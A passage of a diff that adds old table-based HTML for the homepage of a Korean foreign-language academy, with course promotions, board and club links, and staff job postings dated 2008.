+                                                                                                                  </td>
+                                                      </tr>
+                                                      <tr>
+                                                        <td width="394" height="1" bgcolor="D9D9D9"></td>
+                                                      </tr>
+                                                    </table>
+                                                    <!-- 공지사항 끝 --></td>
+                                                <td width="17">&nbsp;</td>
+                                                    <td width="164"><!-- 추천 강사 이미지 시작 → 관리자에서 사이즈 고정(width=164 , height=139)-->
+                                                      <A HREF="http://www.easyedu.net/easy/t_sub01_01.asp" >
+                                                      <img src = "/pds/main/adam copy.jpg" width = 164 height = 139 border = 0>
+                                                      </A><!-- 추천 강사 이미지 끝 --></td>
+                                              </tr>
+                                          </table></td>
+                                        </tr>
+										  <tr>
+                                          <td width="575" height="15"></td>
+                                        </tr>
+										  <tr>
+                                            <td><!-- Soecial 강의 프로그램 시작 -->
+                                                <table width="575" border="0" cellspacing="0" cellpadding="0">
+                                                  <tr>
+                                                    <td><table width="575" border="0" cellspacing="0" cellpadding="0">
+                                                        <tr>
+                                                          <td width="500"><img src="images/cen_spe_title.gif" width="108" height="14" hspace="5"></td>
+                                                          <td width="75" align="right"><a href="#"  onFocus='blur()'>
+                                                            <!img src="../images/btn_more.gif" alt="more" width="37" height="12" hspace="5" border="0">
+                                                          </a></td>
+                                                        </tr>
+                                                    </table></td>
+                                                  </tr>
+                                                  <tr>
+                                                    <td style="padding-top:5"><table width="575" border="0" cellspacing="0" cellpadding="0">
+                                                        <tr>
+                                                          <td width="189" background="images/cen_spe_01_bg.gif"><!-- Soecial 강의 프로그램 1 -->
+                                                              <table width="189" border="0" cellspacing="0" cellpadding="0">
+                                                                <tr>
+                                                                  <td height="10" valign="top"><img src="images/cen_spe_01_top.gif" width="189" height="4"></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td height="24" align="center" background="images/cen_spe_01.gif" style="padding-top:5"><!-- 제목 표시 -->
+                                                                      <font color="#F6DCD8"><strong>
+                                                                        어학연수 대비
+                                                                      </strong></font></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td align="center" valign="middle" style="padding-top:10; padding-bottom:5"><!-- 간단한 설명 표시 -->
+                                                                      
+                                                                    <A HREF="http://www.easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=670&table=tbboard_news&easy=easy1" >
+                                                                      Power Speaking으로<br>Buil up하고싶은사람<br>영어권 어학연수를 계획중인 사람</a>
+                                                                                                                                        </td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td><img src="images/cen_spe_01_bot.gif" width="189" height="4"></td>
+                                                                </tr>
+                                                            </table></td>
+                                                          <td width="4">&nbsp;</td>
+                                                          <td width="189" background="images/cen_spe_02_bg.gif"><!-- Soecial 강의 프로그램 2 -->
+                                                              <table width="189" border="0" cellspacing="0" cellpadding="0">
+                                                                <tr>
+                                                                  <td height="10" valign="top"><img src="images/cen_spe_02_top.gif" width="189" height="4"></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td height="24" align="center" background="images/cen_spe_02.gif" style="padding-top:5"><font color="#F1E0C6"><strong>
+                                                                    <!-- 제목 표시 -->
+                                                                    JULIA  중급문법
+                                                                  </strong></font></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td align="center" valign="middle" style="padding-top:10; padding-bottom:5"><!-- 간단한 설명 표시 -->
+                                                                      
+                                                                    <A HREF="http://www.easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=674&table=tbboard_news&easy=easy1" >
+                                                                      기본 영어의 확실한 재정립<br>영어 학습자를 위한 최적 가이드</a>
+                                                                      </td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td><img src="images/cen_spe_02_bot.gif" width="189" height="4"></td>
+                                                                </tr>
+                                                            </table></td>
+                                                          <td width="4">&nbsp;</td>
+                                                          <td width="189" background="images/cen_spe_03_bg.gif"><!-- Soecial 강의 프로그램 3 -->
+                                                              <table width="189" border="0" cellspacing="0" cellpadding="0">
+                                                                <tr>
+                                                                  <td height="10" valign="top"><img src="images/cen_spe_03_top.gif" width="189" height="4"></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td height="24" align="center" background="images/cen_spe_03.gif" style="padding-top:5"><font color="#F1E0C6"><strong>
+                                                                    <!-- 제목 표시 -->
+                                                                    </strong></font><font color="#DAEBB1"><strong>
+                                                                      토익/토플 무료강좌
+                                                                  </strong></font></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td align="center" valign="middle" style="padding-top:10; padding-bottom:5"><!-- 간단한 설명 표시 -->
+                                                                      
+                                                                    <A HREF="http://www.easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=557&table=tbboard_news&easy=easy1" >
+                                                                      쏟아지는 무료강좌 챙겨 챙겨~<br>주말 토익/토플 무료강좌</a>
+                                                                      </td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td><img src="images/cen_spe_03_bot.gif" width="189" height="4"></td>
+                                                                </tr>
+                                                            </table></td>
+                                                        </tr>
+                                                    </table></td>
+                                                  </tr>
+                                                </table>
+                                              <!-- Soecial 강의 프로그램 끝 --></td>
+										    </tr>
+										  <tr>
+                                            <td height="15"></td>
+										    </tr>
+                                        <tr>
+                                          <td width="575"><!-- 스터디수강후기 시작--><!-- 스터디/수강후기 끝 --></td>
+                                        </tr>
+                                        <tr>
+                                          <td><img src="images/cen_eng_top.gif" width="575" height="4"></td>
+                                        </tr>
+                                        <tr>
+                                          <td align="center" background="images/cen_fin_bg.gif" style="padding-top:10; padding-bottom:10"><table width="545" border="0" cellspacing="0" cellpadding="0">
+                                              <tr>
+                                                <td width="5">&nbsp;</td>
+                                                <td width="154"><!-- 스터디그룹 -->
+                                                    <table border="0" cellspacing="0" cellpadding="0">
+                                                      <tr>
+                                                        <td align="left" style="padding-bottom:5"><table width="154" height="20" border="0" cellpadding="0" cellspacing="0" bgcolor="cccccc" class="board_table">
+                                                            <tr>
+                                                              <td width="154" height="20" align="center" valign="middle" bgcolor="EFEFEF" >
+                                                                  <A HREF="http://www.easyedu.net/easy5/sub06_04.asp" >
+                                                                  
+                                                                  <font color="#009966"><strong>취업정보공유</strong></font></A>
+                                                                  </td>
+                                                            </tr>
+                                                        </table></td>
+                                                      </tr>
+                                                      <tr>
+                                                        <td align="left"><table border="0" cellspacing="0" cellpadding="0">
+                                                            <tr>
+                                                              <td  style="padding-top:5">
+                                                                  <A HREF="http://www.easyedu.net/easy5/sub06_04.asp" >
+                                                                  취업성공 경험담이나 취업시 주의사항을 서로 공유하는 곳입니다.</a>
+                                                                  </td>
+                                                            </tr>
+                                                        </table></td>
+                                                      </tr>
+                                                  </table></td>
+                                                <td width="34">&nbsp;</td>
+                                                <td width="154"><!-- 실전완성반 -->
+                                                    <table border="0" cellspacing="0" cellpadding="0">
+                                                      <tr>
+                                                        <td align="left" style="padding-bottom:5"><table width="154" height="20" border="0" cellpadding="0" cellspacing="0" bgcolor="cccccc" class="board_table">
+                                                            <tr>
+                                                              <td width="154" height="20" align="center" valign="middle" bgcolor="EFEFEF" ><!-- 제목 표시-->
+                                                                  
+                                                                  <A HREF="http://www.easyedu.net/easy5/sub09_05.asp" >
+                                                                  
+                                                                  <font color="#009966"><strong>모의토익/JLPT/편입</strong></font></A>
+                                                                  </td>
+                                                            </tr>
+                                                        </table></td>
+                                                      </tr>
+                                                      <tr>
+                                                        <td align="left"><table border="0" cellspacing="0" cellpadding="0">
+                                                            <tr>
+                                                              <td style="padding-top:5">
+                                                                  <A HREF="http://www.easyedu.net/easy5/sub09_05.asp" >
+                                                                  모의토익/모의JLPT/모의편입시험 누구나 신청하실 수 있습니다(선착순) </a>
+                                                                  </td>
+                                                            </tr>
+                                                        </table></td>
+                                                      </tr>
+                                                  </table></td>
+                                                <td width="34">&nbsp;</td>
+                                                <td width="154"><!-- 수강전각오/후기-->
+                                                    <table border="0" cellspacing="0" cellpadding="0">
+                                                      <tr>
+                                                        <td align="left" style="padding-bottom:5"><table width="154" height="20" border="0" cellpadding="0" cellspacing="0" bgcolor="cccccc" class="board_table">
+                                                            <tr>
+                                                              <td width="154" height="20" align="center" valign="middle" bgcolor="EFEFEF" ><!-- 제목 표시-->
+                                                                  
+                                                                  <A HREF="http://www.easyedu.net/easy1/sub07_09.asp" >
+                                                                  
+                                                                  <font color="#009966"><strong>수강후기 작성 및 보기</strong></font></A>
+                                                                  </td>
+                                                            </tr>
+                                                        </table></td>
+                                                      </tr>
+                                                      <tr>
+                                                        <td align="left"><table border="0" cellspacing="0" cellpadding="0">
+                                                          <td style="padding-top:5">
+                          <A HREF="http://www.easyedu.net/easy1/sub07_09.asp" >
+                          이지외국어학원 강의에서 느꼈던 고객님들의 의견을 작성해주세요 ! </a>
+                          </td>
+                                                          </tr>
+                                                        </table></td>
+                                                      </tr>
+                                                  </table></td>
+                                              </tr>
+                                          </table></td>
+                                        </tr>
+                                        <tr>
+                                          <td><img src="images/cen_eng_bot.gif" width="575" height="4"></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="575" height="15"></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="575"><!-- 영어시험을 준비하는 교육 프로그램 시작 --><table width="575" border="0" cellspacing="0" cellpadding="0">
+                                              <tr>
+                                                <td width="575" style="padding-bottom:5"><table width="575" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr>
+                                                      <td width="175"><img src="images/cen_eng_title.gif" width="170" height="16"></td>
+                                                          <td width="400" align="right" valign="bottom" class="s_txt"><!-- 영어시험을 준비하는 교육 프로그램 MENU 표시 --><a href="/easy5/sub02_01_01.asp" onfocus='blur()' class="s_txt">TOEIC</a><img src="../images/bar.gif" width="15" height="10" align="absmiddle"><a href="/easy5/sub02_04_01.asp" onfocus='blur()' class="s_txt">TOEFL</a><img src="../images/bar.gif" width="15" height="10" align="absmiddle"><a href="http://www.easyedu.net/admision/adm1.asp" onfocus='blur()' class="s_txt">편 입</a><img src="../images/bar.gif" width="15" height="10" align="absmiddle"><a href="/easy5/sub02_06_01.asp" onfocus='blur()' class="s_txt">문법 & 독해반</a><img src="../images/bar.gif" width="15" height="10" align="absmiddle"><a href="/easy5/sub02_02_01.asp" onfocus='blur()' class="s_txt">뉴토익 S/W </a></td>
+                                                    </tr>
+                                                </table></td>
+                                              </tr>
+                                              <tr>
+                                                <td width="575"><img src="images/cen_eng_top.gif" width="575" height="4"></td>
+                                              </tr>
+                                              <tr>
+                                                <td width="575" align="center" background="images/cen_eng_bg.gif" style="padding-top:10; padding-bottom:10"><table width="545" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr>
+                                                      <td width="260"><!-- 영어시험을 준비하는 교육 프로그램 1 --><table width="260" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="75" align="left"><table width="59" height="59" border="0" cellpadding="0" cellspacing="0" class="board_table">
+                                                                <tr>
+                                                                  <td width="59" height="59" align="center" valign="middle"><!-- 사진 표시 --><A HREF="http://www.easyedu.net/easy5/sub07_01.asp?inc=/include/view.asp&no=655&table=tbboard_news&easy=easy5" ><img src = "/pds/main/Untitled-2.jpg" width = 55 height = 55 border = 0></A></td>
+                                                                </tr>
+                                                            </table></td>
+                                                            <td width="185" align="left"><table width="185" border="0" cellspacing="0" cellpadding="0">
+                                                                <tr>
+                                                                  <td width="185"><!-- 제목 표시 --><A HREF="http://www.easyedu.net/easy5/sub07_01.asp?inc=/include/view.asp&no=655&table=tbboard_news&easy=easy5" ><font color="#3F6DAC"><strong><u>스파르타 토익</u></strong></font></A></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td width="185" style="padding-top:5"><A HREF="http://www.easyedu.net/easy5/sub07_01.asp?inc=/include/view.asp&no=655&table=tbboard_news&easy=easy5" >토익가격은 저렴하게 공부는 더 많이!!!!! <img src="../images/btn_detaile.gif" alt="자세히" width="51" height="15" border="0" align="absmiddle"></a></td>
+                                                                </tr>
+                                                            </table></td>
+                                                          </tr>
+                                                      </table></td>
+                                                      <td width="15">&nbsp;</td>
+                                                      <td width="270"><!-- 영어시험을 준비하는 교육 프로그램 2 --><table width="260" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="75" align="left"><table width="59" height="59" border="0" cellpadding="0" cellspacing="0" class="board_table">
+                                                                <tr>
+                                                                      <td width="59" height="59" align="center" valign="middle"><!-- 사진 표시 --><A HREF="http://www.easyedu.net/admision/adm1.asp" ><img src = "/pds/main/0115_1(1).jpg" width = 55 height = 55 border = 0></A></td>
+                                                                </tr>
+                                                            </table></td>
+                                                            <td width="185" align="left"><table width="185" border="0" cellspacing="0" cellpadding="0">
+                                                                <tr>
+                                                                  <td width="185"><!-- 제목 표시 --><A HREF="http://www.easyedu.net/admision/adm1.asp" ><font color="#3F6DAC"><strong><u>일반편입반&편입 특강</u></strong></font></A></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td width="185" style="padding-top:5"><A HREF="http://www.easyedu.net/admision/adm1.asp" >각 대학별 유형별로 무료모의고사 실시!! <img src="../images/btn_detaile.gif" alt="자세히" width="51" height="15" border="0" align="absmiddle"></a></td>
+                                                                </tr>
+                                                            </table></td>
+                                                           </tr>
+                                                            </table></td>
+                                                    </tr>
+                                                </table></td>
+                                              </tr>
+                                              <tr>
+                                                <td width="575"><img src="images/cen_eng_bot.gif" width="575" height="4"></td>
+                                              </tr>
+                                          </table><!-- 영어시험을 준비하는 교육 프로그램 끝 --></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="575" height="15"></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="575"><!-- 외국어는 외국어전문학원에서 시작하세요! 시작 --><table width="575" border="0" cellspacing="0" cellpadding="0">
+                                              <tr>
+                                                <td width="575" style="padding-bottom:5"><table width="575" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr>
+                                                      <td width="210"><img src="images/cen_stu_title.gif" width="276" height="16"></td>
+                                                          <td width="365" align="right" valign="bottom" class="s_txt" style="padding-right:5"><!-- 외국어는 외국어전문학원에서 시작하세요! MENU 표시 --><!-- <img src="../images/sim_icon.gif" width="4" height="5" align="absmiddle" style="margin-right:7">중고생을 위한 다양한 프로그램&nbsp;&nbsp;&nbsp;<a href="#" onfocus='blur()' class="s_txt">평일반</a><img src="../images/bar.gif" width="15" height="10" align="absmiddle"><a href="#" onfocus='blur()' class="s_txt">주말반</a>&nbsp;&nbsp;&nbsp;<a href="#"  onFocus='blur()' class="s_txt"><u>각 
+                                                            과정 혜택적용</u></a> --></td>
+                                                    </tr>
+                                                </table></td>
+                                              </tr>
+                                              <tr>
+                                                <td width="575" height="2" bgcolor="D9D9D9"></td>
+                                              </tr>
+                                              <tr>
+                                                <td width="575" align="center" valign="top" style="padding-top:13"><table width="559" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr>
+                                                      <td width="179"><!-- 외국어는 외국어전문학원에서 시작하세요! 1 --><table width="179" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="179"><!-- 배너 이미지 표시 → 사이즈 고정(width=179 , height=62) --><!-- 사진 표시 --><A HREF="http://easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=632&table=tbboard_news&easy=easy1" ><img src = "/pds/main/Untitled-4(1).jpg" width = 179 height = 62 border = 0></A></td>
+                                                          </tr>
+                                                          <tr>
+                                                            <td width="179" style="padding-top:10; padding-left:5"><A HREF="http://easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=632&table=tbboard_news&easy=easy1" class = "board" ><strong><!-- 제목 표시 --> 1개월속성 회화+문법</a></strong><br>
+                                                                  <img src="../images/cross_icon.gif" width="3" height="3" border="0" align="absmiddle" style="margin-right:7"><A HREF="http://easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=632&table=tbboard_news&easy=easy1" class = "board" >영어회화 + 문법</a>
+                                                                  <br>
+                                                                  <img src="../images/cross_icon.gif" width="3" height="3" border="0" align="absmiddle" style="margin-right:7"><A HREF="http://easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=632&table=tbboard_news&easy=easy1" class = "board" >단기간에 잡자!!</a>                                                                </td>
+                                                          </tr>
+                                                      </table></td>
+                                                      <td width="11">&nbsp;</td>
+                                                      <td width="179"><!-- 외국어는 외국어전문학원에서 시작하세요! 2 --><table width="179" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="179"><!-- 배너 이미지 표시 → 사이즈 고정(width=179 , height=62) --><!-- 사진 표시 --><A HREF="http://www.easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=481&table=tbboard_news&easy=easy1" ><img src = "/pds/main/0702_1.jpg" width = 179 height = 62 border = 0></A></td>
+                                                          </tr>
+                                                          <tr>
+                                                            <td width="179" style="padding-top:10; padding-left:5"><A HREF="http://www.easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=481&table=tbboard_news&easy=easy1" class = "board" ><strong><!-- 제목 표시 --> 문법정복!!</a></strong><br>
+                                                                  <img src="../images/cross_icon.gif" width="3" height="3" border="0" align="absmiddle" style="margin-right:7">문법 YES! 완전정복!!</a>
+                                                                  <br>
+                                                                  <img src="../images/cross_icon.gif" width="3" height="3" border="0" align="absmiddle" style="margin-right:7">회화와 함게 문법도 잡자!!</a>                                                                </td>
+                                                          </tr>
+                                                      </table></td>
+                                                      <td width="11">&nbsp;</td>
+                                                      <td width="179"><!-- 외국어는 외국어전문학원에서 시작하세요! 3 --><table width="179" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="179"><!-- 배너 이미지 표시 → 사이즈 고정(width=179 , height=62) --><!-- 사진 표시 --><A HREF="http://www.easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=674&table=tbboard_news&easy=easy1" ><img src = "/pds/main/줄리아중급문법.jpg" width = 179 height = 62 border = 0></A></td>
+                                                          </tr>
+                                                          <tr>
+                                                            <td width="179" style="padding-top:10; padding-left:5"><A HREF="http://www.easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=674&table=tbboard_news&easy=easy1" class = "board" ><strong><!-- 제목 표시 --> 문법향상을 위한 Check up!!</a></strong><br>
+                                                                  <img src="../images/cross_icon.gif" width="3" height="3" border="0" align="absmiddle" style="margin-right:7">보다 나은 영어 실력을 위해!!</a>
+                                                                  <br>
+                                                                  <img src="../images/cross_icon.gif" width="3" height="3" border="0" align="absmiddle" style="margin-right:7">꼭 필요한 문법 기본원리까지!!</a>                                                                </td>
+                                                          </tr>
+                                                      </table></td>
+                                                    </tr>
+                                                </table></td>
+                                              </tr>
+                                          </table><!-- 외국어는 외국어전문학원에서 시작하세요! 끝 --></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="575" height="15"></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="575"><!-- 이지외국어학원의 이모저모 시작 --><table width="575" border="0" cellspacing="0" cellpadding="0">
+                                              <tr>
+                                                <td width="575"><img src="images/cen_eng_top.gif" width="575" height="4"></td>
+                                              </tr>
+                                              <tr>
+                                                <td width="575" background="images/cen_pic_bg.gif" style="padding-top:10"><table width="575" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr>
+                                                      <td align="left"><table width="572" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="12"></td>
+                                                            <td width="172"><img src="images/cen_pic_title.gif" width="172" height="30"></td>
+                                                            <td width="388" align="right" style="background-image:url('images/cen_pic_title_bg.gif'); background-repeat:repeat-x;"><table width="100%" border="0" cellpadding="0" cellspacing="0">
+                                                                    <tr> 
+                                                                      <td align="right" class="s_txt" style="padding-top:3; padding-right:6"><!-- 이지외국어학원의 이모저모 MENU 표시 --><a href="/easy1/sub01_05_01.asp" onfocus='blur()' class="s_txt">캠퍼스 
+                                                                        사진</a><img src="../images/bar_1.gif" width="19" height="19" align="absmiddle"><a href="/easy1/sub01_05_02.asp" onfocus='blur()' class="s_txt">강의실 
+                                                                        사진</a><img src="../images/bar_1.gif" width="19" height="19" align="absmiddle"><a href="/easy1/sub01_05_03.asp" onfocus='blur()' class="s_txt">수업 
+                                                                        사진</a><img src="../images/bar_1.gif" width="19" height="19" align="absmiddle"><a href="/easy1/sub01_05_04.asp" onfocus='blur()' class="s_txt">학원시설 
+                                                                        사진</a></td>
+                                                                      <td width="65" align="center" background="../images/minihomepy_bg.gif" class="s_txt" style="padding-top:2"><a href="/easy1/sub10_01.asp" target="_self" class="s_txt" onfocus='blur()'><strong><font color="#FC5F00">U</font><font color="#FCA000">C</font><font color="#00A00F">C</font><font color="#2E65AF">보기</font></strong></a></td>
+                                                                    </tr>
+                                                                  </table></td>
+                                                          </tr>
+                                                      </table></td>
+                                                    </tr>
+                                                    
+                                                </table></td>
+                                              </tr>
+                                              <tr>
+                                                <td width="575"><img src="images/cen_eng_bot.gif" width="575" height="4"></td>
+                                              </tr>
+                                          </table><!-- 이지외국어학원의 이모저모 끝 --></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="575" height="15"></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="575"><table width="575" border="0" cellspacing="0" cellpadding="0">
+                                              <tr>
+                                                <td width="189" valign = top><!-- 추천 커뮤니티 시작 --><table width="189" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr>
+                                                      <td width="189" valign="bottom"><img src="images/cen_com_title.gif" width="104" height="25" hspace="5"></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td><table width="189"  border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="3" height="3" align="left" valign="top"><img src="../images/table_left_top.gif" width="3" height="3"></td>
+                                                            <td width="183" height="3" valign="top"><table width="183" border="0" cellspacing="0" cellpadding="0">
+                                                                <tr>
+                                                                  <td height="1" bgcolor="#D9D9D9"></td>
+                                                                </tr>
+                                                            </table></td>
+                                                            <td width="3" height="3" align="left" valign="top"><img src="../images/table_right_top.gif" width="3" height="3"></td>
+                                                          </tr>
+                                                      </table></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td valign = top><table width="189"  height="140" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="1" bgcolor="#D9D9D9"></td>
+                                                                <td width="187" align="center" valign="TOP"><!--리스트 시작 --><table width="165" border="0" cellspacing="0" cellpadding="0">
+ 
+                                                                <tr>
+                                                                  <td width="165" height="24"><img src="../images/cross_icon.gif" width="3" height="3" align="absmiddle" style="margin-right:7"><a href="../easy1/sub04_club_main.asp?club_num=53" target="_top" onfocus='blur()' title = "............" class=board>............</a>..</td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td height="1" background="../images/line_dot.gif"></td>
+                                                                </tr>
+	
+                                                                <tr>
+                                                                  <td width="165" height="24"><img src="../images/cross_icon.gif" width="3" height="3" align="absmiddle" style="margin-right:7"><a href="../easy1/sub04_club_main.asp?club_num=46" target="_top" onfocus='blur()' title = "POP TOEIC ~!!" class=board>POP TOEIC ~!</a>..</td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td height="1" background="../images/line_dot.gif"></td>
+                                                                </tr>
+	
+                                                                <tr>
+                                                                  <td width="165" height="24"><img src="../images/cross_icon.gif" width="3" height="3" align="absmiddle" style="margin-right:7"><a href="../easy1/sub04_club_main.asp?club_num=18" target="_top" onfocus='blur()' title = "Enjoy JOY TOEIC" class=board>Enjoy JOY TO</a>..</td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td height="1" background="../images/line_dot.gif"></td>
+                                                                </tr>
+	
+                                                                
+                                                            </table><!-- 리스트 끝 --></td>
+                                                            <td width="1" bgcolor="#D9D9D9"></td>
+                                                          </tr>
+                                                      </table></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td><table width="189" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="3" height="3"><img src="../images/table_left_bot.gif"></td>
+                                                            <td height="3"><table width="183" border="0" cellspacing="0" cellpadding="0">
+                                                                <tr>
+                                                                  <td height="1" bgcolor="#D9D9D9"></td>
+                                                                </tr>
+                                                            </table></td>
+                                                            <td width="3" height="3"><img src="../images/table_right_bot.gif"></td>
+                                                          </tr>
+                                                      </table></td>
+                                                    </tr>
+                                                </table><!-- 추천 커뮤니티 끝 --></td>
+                                                <td width="15">&nbsp;</td>
+                                                <td width="371"><!-- 구인 정보 시작 --><table width="371" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr>
+                                                      <td><table width="371" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="92"><img src="images/cen_info.gif" width="92" height="25" hspace="5"></td>
+                                                                <td align="right" class="s_txt" style="padding-right:10"><!-- 구인정보 MENU 표시 --><a href="../easy/job_sub01.asp" onfocus='blur()' class="s_txt">역전1</a><img src="../images/bar.gif" width="15" height="10" align="absmiddle"><a href="../easy/job_sub02.asp" onfocus='blur()' class="s_txt">역전2</a><img src="../images/bar.gif" width="15" height="10" align="absmiddle"><a href="../easy/job_sub05.asp" onfocus='blur()' class="s_txt">역전3</a><img src="../images/bar.gif" width="15" height="10" align="absmiddle"><a href="../easy/job_sub03.asp" onfocus='blur()' class="s_txt">동수원</a><img src="../images/bar.gif" width="15" height="10" align="absmiddle"><a href="http://www.easyuhak.co.kr/" target="_blank" class="s_txt" onfocus='blur()'>유학원</a></td>
+                                                          </tr>
+                                                      </table></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td><table width="371"  border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="3" height="3" align="left" valign="top"><img src="../images/table_left_top.gif" width="3" height="3"></td>
+                                                            <td width="365" height="3" valign="top"><table width="365" border="0" cellspacing="0" cellpadding="0">
+                                                                <tr>
+                                                                  <td height="1" bgcolor="#D9D9D9"></td>
+                                                                </tr>
+                                                            </table></td>
+                                                            <td width="3" height="3" align="left" valign="top"><img src="../images/table_right_top.gif" width="3" height="3"></td>
+                                                          </tr>
+                                                      </table></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td><table width="371"  height="140" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="1" bgcolor="#D9D9D9"></td>
+                                                            <td width="369" align="center" valign="top"><!-- 리스트 시작 --><table width="350" border="0" cellspacing="0" cellpadding="0">
+															<tr><td height = 8></td></tr>
+															
+                                                                <tr>
+                                                                  <td width="350" align="center"><table width="344" border="0" cellspacing="0" cellpadding="0">
+                                                                      <tr>
+                                                                        <td width="50" valign="top"><img src="../images/cross_icon.gif" width="3" height="3" align="absmiddle" style="margin-right:7"><strong><!-- 강사/직원/알바 구분 표시 -->[직원]</strong> </td>
+                                                                        <td width="194" valign="top"><a href="../easy/job_sub01.asp" onfocus='blur()' class="board"><!-- 내용 표시 -->웹디자인/프래그래머...<!-- 신규 등록시 표시 --><br>
+                                                                  신입/경력 / 상시</a></td>
+                                                                        <td width="100" align="right" class="num"><!-- 등록일 표시 -->2008-07-17</td>
+                                                                      </tr>
+                                                                  </table></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td height="1" background="../images/line_dot.gif"></td>
+                                                                </tr>
+																
+                                                                <tr>
+                                                                  <td width="350" align="center"><table width="344" border="0" cellspacing="0" cellpadding="0">
+                                                                      <tr>
+                                                                        <td width="50" valign="top"><img src="../images/cross_icon.gif" width="3" height="3" align="absmiddle" style="margin-right:7"><strong><!-- 강사/직원/알바 구분 표시 -->[직원]</strong> </td>
+                                                                        <td width="194" valign="top"><a href="../easy/job_sub01.asp" onfocus='blur()' class="board"><!-- 내용 표시 -->유학부/유학상담/리...<!-- 신규 등록시 표시 --><br>
+                                                                  신입/경력 / 상시모직</a></td>
+                                                                        <td width="100" align="right" class="num"><!-- 등록일 표시 -->2008-07-17</td>
+                                                                      </tr>
+                                                                  </table></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td height="1" background="../images/line_dot.gif"></td>
+                                                                </tr>
+																
+                                                                <tr>
+                                                                  <td width="350" align="center"><table width="344" border="0" cellspacing="0" cellpadding="0">
+                                                                      <tr>
+                                                                        <td width="50" valign="top"><img src="../images/cross_icon.gif" width="3" height="3" align="absmiddle" style="margin-right:7"><strong><!-- 강사/직원/알바 구분 표시 -->[알바]</strong> </td>
+                                                                        <td width="194" valign="top"><a href="../easy/job_sub01.asp" onfocus='blur()' class="board"><!-- 내용 표시 -->안내데스크 근무(주...<!-- 신규 등록시 표시 --><br>
+                                                                  3800원 / 상시모집</a></td>
+                                                                        <td width="100" align="right" class="num"><!-- 등록일 표시 -->2008-07-17</td>
+                                                                      </tr>
+                                                                  </table></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td height="1" background="../images/line_dot.gif"></td>
+                                                                </tr>
+																
+                                                                <tr>
+                                                                  <td width="350" align="center"><table width="344" border="0" cellspacing="0" cellpadding="0">
+                                                                      <tr>
+                                                                        <td width="50" valign="top"><img src="../images/cross_icon.gif" width="3" height="3" align="absmiddle" style="margin-right:7"><strong><!-- 강사/직원/알바 구분 표시 -->[강사]</strong> </td>
+                                                                        <td width="194" valign="top"><a href="../easy/job_sub01.asp" onfocus='blur()' class="board"><!-- 내용 표시 -->영어/토익/토플/초...<!-- 신규 등록시 표시 --><br>
+                                                                  신입/경력(우대) / 상시모집</a></td>
+                                                                        <td width="100" align="right" class="num"><!-- 등록일 표시 -->2006-02-27</td>
+                                                                      </tr>
+                                                                  </table></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td height="1" background="../images/line_dot.gif"></td>
+                                                                </tr>
+																
+                                                                <tr>
+                                                                  <td width="350" align="center"><table width="344" border="0" cellspacing="0" cellpadding="0">
+                                                                      <tr>
+                                                                        <td width="50" valign="top"><img src="../images/cross_icon.gif" width="3" height="3" align="absmiddle" style="margin-right:7"><strong><!-- 강사/직원/알바 구분 표시 -->[강사]</strong> </td>
